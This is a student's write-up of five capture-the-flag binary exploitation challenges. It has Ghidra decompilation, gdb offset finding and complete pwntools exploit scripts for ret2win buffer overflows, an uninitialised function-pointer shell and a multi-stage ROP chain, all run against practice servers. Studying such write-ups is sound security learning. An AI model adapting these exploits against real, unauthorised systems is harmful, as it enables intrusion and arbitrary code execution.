# Imma Dev

## Solution:

- Testing what happens when we first connect locally\
```
aditya@LAPTOP-FKJS79ON:/mnt/c/users/aditya/desktop/Custom_c/binary exploitation/imma_dev/src$ nc localhost 5151
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1
Input your name: aditya
Hi aditya
```
```
2
Error: Option 2 requires root privileges HAHA
```
```
3
Input Username:
admin
Enter Password:
admin
lmeow i forgot to make the db
```

- From this we understand that nothing much can be done here so we need to open the binary in Ghidra
- We see a few functions `handleOption` `login` `main` `printFlag` `sayHello`
- The function `handleOption()` contains a Logic Flaw
- This function checked the first number provided in the input string `local_428[0]` is 2 to restrict access
```
if ((local_428[0] == 2) && (_Var3 = geteuid(), _Var3 != 0))
```
- `for` loop is used to iterate through every number in the input list `local_428` executing the corresponding function for each one
```
for (local_5cc = 0; local_5cc < local_5d0; local_5cc = local_5cc + 1) {
  iVar1 = local_428[local_5cc];
}
```

- To get the flag we must enter `1 2`
- 1 to use `sayhello` function and 2 will use the `printflag()`
- now connecting to netcat and getting the flag
```
aditya@LAPTOP-FKJS79ON:/mnt/c/users/aditya/desktop/Custom_c/binary exploitation/imma_dev/src$ nc immadeveloper.nitephase.live 61234
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1 2
Input your name: aditya
Hi aditya
nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```

Flag: 
```
nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```

## Concepts learnt:

- Learned how to navigate and analyze decompiled code using Ghidra.

- Learned how to identify logical flaws in a program and exploit them.

## Notes:

At first it seemed like a stack overflow problem but apparently it was something different this time


***

# Performative

## Solution:

Running the program locally to check what it is about

```
aditya@LAPTOP-FKJS79ON:/mnt/c/users/Aditya/Desktop/Custom_C/Binary Exploitation/performative/src$ nc localhost 5000
### Welcome to the performative male/female parade! ###

Yk what performative people like? just a plain ol' bof!

Lets just generate a buffer then ig?

Buffer: 123456789123456789
Generating your buffer...

Your custom buffer:
========================
123456789123456789

```


- Now taking a look at the decomplied code using ghidra
- There are 4 functions `main` `printFlag` `setup` `win`
```
int main(int argc,char **argv)

{
  char **argv_local;
  int argc_local;
  char buffer [20];
  
  setup();
  puts("### Welcome to the performative male/female parade! ###");
  puts("");
  puts("Yk what performative people like? just a plain ol\' bof!");
  puts("\nLets just generate a buffer then ig?");
  printf("\nBuffer: ");
  __isoc23_scanf(&DAT_00402013,buffer);
  puts("Generating your buffer...");
  usleep(500);
  puts("");
  puts("Your custom buffer:");
  puts("========================");
  puts(buffer);
  return 0;
```
- In the main function a buffer of 20 bytes is declared and input is taked using `scanf`
- Since `scanf` does not check input length we can overflow the buffer
- Now we need to find the exact offset required for buffer to overflow to the flag
- We can use gdb with `info registers` `x/gx $rsp` and `pwn cyclic -l`

- First create custom buffer with `pwn cyclic 100`
- Paste that into the running binary in gdb
- Now read the stack pointer register using `info registers`
```
rsp            0x7fffffffdd68      0x7fffffffdd68
```
- Check the data with `x/gx $rsp`
```
(gdb) x/gx $rsp
0x7fffffffdd68: 0x6161616c6161616b
```
- Finally, we get the offset with `pwn cyclic -l 0x6161616c6161616b` 
```
40
```

- Now we can create a python script with pwntools to find the flag

```python
from pwn import *

exe = './perf'  
elf = ELF(exe)


host = 'performative.nitephase.live'
port = 56743
p = remote(host, port)

win_addr = elf.symbols['win']

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

offset = 40

payload = b'A' * offset
payload += p64(ret_gadget) 
payload += p64(win_addr)   

p.recvuntil(b'Buffer: ')
p.sendline(payload)

p.interactive()
```



## Flag:
```
nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
```

## Concepts learnt:

- scanf, gets, or strcpy are dangerous if used without limits
- using ghidra to find the exact offset instead of guessing it


## Notes:
- The binary wont run on wsl but worked on kali due to compatibility issues
- solved a Ret2Win challenge

***

# Property in Manipal

## Solution:

- Looking at the dissasembly in ghidra we can see a gets() being used in the vuln() function.
- This is an infamous hint for buffer overflow
- Now we can check the offset size using the gdb method I used in the previous chal
- from gdb, the offset is 72
- Now we can create a script to fetch the flag

```python

from pwn import *

exe = './manipal' 
elf = context.binary = ELF(exe, checksec=False)
host = 'propertyinmanipal.nitephase.live'
port = 42586
p = remote(host, port)
offset = 72
p.sendlineafter(b"Enter your name", b"Exploiter")

win_addr = elf.symbols['win']
log.info(f"Win Function Address: {hex(win_addr)}")

rop = ROP(elf)
rop.raw(rop.find_gadget(['ret'])[0])

payload = flat(
    b"A" * offset, 
    rop.chain(),   
    win_addr       
)

p.sendlineafter(b"Enter the amount", payload)
p.interactive()


```

- The gets() function writes 'A's over the buffer, the saved RBP. It and finally overwrites the Return Address with the address of the win() function.
- When vuln() finishes, it calls the RET instruction. 
- Since we replaced the return address, the CPU doesn't go back to main but to win instead.
- The win function executes system("cat flag.txt"), giving us the flag

Flag:
```
nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}
```

Resources:
- (https://www.youtube.com/watch?v=8zRoMAkGYQE)


***

# Hungry

## Solution

- After decompilation, the following functions are the most important: `manager_control_panel` `grilled` `fried` `take_order` `choose_style` `main `
- The vulnerability lies in the interaction between take_order() and choose_style().
```
iVar1 = strcmp(local_18,"grilled");
if (iVar1 == 0) {
    local_20 = grilled;
}
else {
    iVar1 = strcmp(local_18,"fried");
    if (iVar1 == 0) {
        local_20 = fried;
    }
    else {
        printf("Sorry, we don\'t serve %s Bit Burgers here.\n",local_18);
    }
}
(*local_20)(); 
```
- if we type anything other than "grilled" or "fried", the program will execute data at the memory address of local_20
- Otherwise, the code enters the else block. It prints an error, and then proceeds to call (*local_20)() anyway
- local_20 still holds value from take_order since its not reinitialized
- We can construct the memory address of the Manager Control Panel (specifically the part that gives us a shell) by selecting specific ingredients in take_order
- Then we can interact with the host to `cat flag.txt`
- run this `objdump -d burgers_are_mid | grep -A 20 manager_control_panel` to find the address of the instructions inside manager_control_panel that spawn the shell.
<img width="1942" height="939" alt="image" src="https://github.com/user-attachments/assets/d6a299b2-55d5-4d8b-a1eb-0e7a9d8e9d14" />


```python
from pwn import *
TARGET_ADDR = 0x401346  
HOST = 'hunger.nitephase.live'
PORT = 53791

r = remote(HOST, PORT)

for i in range(24):
    r.recvuntil(b'(y/n)? ')
    if (TARGET_ADDR >> i) & 1:
        r.sendline(b'y') 
    else:
        r.sendline(b'n') 
r.recvuntil(b'Bit Burger with') 
r.recvuntil(b'fried?: ')    
r.sendline(b'pwned') 
try:
    r.recvlines(2)
except:
    pass
r.interactive()
```
```
[x] Opening connection to hunger.nitephase.live on port 53791
[x] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.167
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Switching to interactive mode
cat flag.txt
nite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}
[*] Got EOF while reading in interactive
[*] Interrupted
[*] Closed connection to hunger.nitephase.live port 53791
```

## Flag:
```
nite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}
```

***

# IQ test

## Solution:
- The src folder has 3 .txt files which makes me believe that there's supposed to be 3 flags in this chal
- Looking at the disassembly and running the binary we get the following info
- `askQuestion` Asks 3 questions. We must answer correctly to proceed.
- `main` has a buffer overflow via fgets. If we overwrite the return address, we can control execution.
- `win1` prints Flag 1 and Contains another overflow. Requires us to jump to `win2` with `RDI == 0xDEADBEEF`\
- `win2` prints Flag 2 and contains a final overflow. Requires us to jump to `win3` with three specific arguments `RDI`, `RSI`, `RDX`.
- So I created a script to find all the flags

```python
from pwn import *
import time

binary = ELF("./chall")
io = remote("iqtest.nitephase.live", 51823)

WIN_STAGE_2 = 0x401314
WIN_STAGE_3 = 0x4011e6

GADGETS = {
    "ret":     0x40101a,
    "pop_rdi": 0x4017d6,
    "pop_rsi": 0x4017d8,
    "pop_rdx": 0x4017da
}

BUF_MAIN = 152
BUF_2    = 40
BUF_3    = 56

def pad(sz):
    return b"A" * sz

stage1 = (
    pad(BUF_MAIN) +
    p64(GADGETS["ret"]) +
    p64(0x401401)
)

stage2 = (
    pad(BUF_2) +
    p64(GADGETS["ret"]) +
    p64(GADGETS["pop_rdi"]) +
    p64(0xdeadbeef) +
    p64(WIN_STAGE_2)
)

stage3 = (
    pad(BUF_3) +
    p64(GADGETS["ret"]) +
    p64(GADGETS["pop_rdi"]) + p64(0xdeadbeef) +
    p64(GADGETS["pop_rsi"]) + p64(0xdeafface) +
    p64(GADGETS["pop_rdx"]) + p64(0xfeedcafe) +
    p64(WIN_STAGE_3)
)

io.sendlineafter(b">", b"2")
io.sendlineafter(b">", b"1")
io.sendlineafter(b">", b"4")

io.recvuntil(b"address: 0x401401")
io.sendline(stage1)

time.sleep(0.5)
io.sendline(stage2)

time.sleep(0.5)
io.sendline(stage3)

io.interactive()
```

In main, fgets reads 0x200 bytes into a small buffer. We need to overflow this and overwrite the Return Instruction Pointer (RIP) with the address of win1.

- Vulnerability: fgets(local_98, 0x200, stdin)
- Offset: 152 bytes.
- Payload: [Padding * 152] + [ret gadget] + [Address of win1]


win1 gives us another overflow. However, win2 checks if the first argument (param_1) is 0xDEADBEEF. In x64 Linux, the first argument is passed in the RDI register.

- Goal: Set RDI = 0xDEADBEEF, then call win2.
- Gadgets Used: pop rdi; ret
- Payload: [Padding * 40] + [pop rdi] + [0xDEADBEEF] + [Address of win2]


win2 provides the final overflow. win3 requires three arguments:

- RDI = 0xDEADBEEF
- RSI = 0xDEAFFACE
- RDX = 0xFEEDCAFE
- Payload: [Padding * 56] + [pop rdi] + [deadbeef] + [pop rsi] + [deafface] + [pop rdx] + [feedcafe] + [Address of win3]

```
PS C:\Users\Aditya\desktop\custom_c\binary exploitation\iqtest-binex\src> python3 solve.py
[*] 'C:\\Users\\Aditya\\desktop\\custom_c\\binary exploitation\\iqtest-binex\\src\\chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[x] Opening connection to iqtest.nitephase.live on port 51823
[x] Opening connection to iqtest.nitephase.live on port 51823: Trying 4.194.142.95
[+] Opening connection to iqtest.nitephase.live on port 51823: Done
[*] Switching to interactive mode

You have passed the first challenge. The next one won't be so simple.
Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. Bring the artifact of 0xDEADBEEF to the temple of 0x401314 to claim your advance.nite{d1d_1_g3t_th3_fl4g?}
Continue:
You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and [0xFEEDCAFE]. You must venture out and find the temple yourself. I believe in you
nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)}
Final Test:
Congratulations. You are deserving of you reward

nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}
[*] Got EOF while reading in interactive
```


## Flag:

```
nite{d1d_1_g3t_th3_fl4g?}
nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)}
nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}
```

